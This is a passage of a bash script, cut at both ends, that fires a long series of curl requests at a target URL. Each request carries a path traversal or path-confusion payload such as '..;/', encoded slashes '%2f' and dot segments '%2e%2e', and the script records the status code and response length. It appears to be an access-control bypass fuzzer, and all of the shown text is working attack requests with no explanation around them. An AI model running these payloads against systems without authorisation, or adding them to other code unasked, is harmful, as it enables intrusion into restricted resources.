echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent")
print
echo -n "Payload [ /..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent")
print
echo -n "Payload [ /..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent")
print
echo -n "Payload [ /..//../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent")
print
echo -n "Payload [ /..//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent")
print
echo -n "Payload [ /../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent")
print
echo -n "Payload [ /../;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent")
print
echo -n "Payload [ /..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent")
print
echo -n "Payload [ /..;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent")
print
echo -n "Payload [ /..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent")
print
echo -n "Payload [ /..;//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent")
print
echo -n "Payload [ /..;//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ /.// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent")
print
echo -n "Payload [ /.;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent")
print
echo -n "Payload [ /.;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent")
print
echo -n "Payload [ //.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent")
print
echo -n "Payload [ //../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent")
print
echo -n "Payload [ //..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent")
print
echo -n "Payload [ //./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent")
print
echo -n "Payload [ //.;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent")
print
echo -n "Payload [ ///.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent")
print
echo -n "Payload [ ///../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent")
print
echo -n "Payload [ ///..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent")
print
echo -n "Payload [ ///..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent")
print
echo -n "Payload [ ///..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent")
print
echo -n "Payload [ ///..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent")
print
echo -n "Payload [ //;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent")
print
echo -n "Payload [ /;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent")
print
echo -n "Payload [ /;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent")
print
echo -n "Payload [ /;x ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent")
print
echo -n "Payload [ /;x/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent")
print
echo -n "Payload [ /x/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent")
print
echo -n "Payload [ /x/..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent")
print
echo -n "Payload [ /x/../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent")
print
echo -n "Payload [ /x/..;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /x//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent")
print
echo -n "Payload [ /x//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent")
print
echo -n "Payload [ /x/;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent")
print
echo -n "Payload [ /x/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent")
print
echo -n "Payload [ ;%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent")
print
echo -n "Payload [ ;%09.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent")
print
echo -n "Payload [ ;%09..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent")
print
echo -n "Payload [ ;%09; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent")
print
echo -n "Payload [ ;%2F.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..///; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;//;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/;// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f/%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f;//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f;/;/..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent")
print
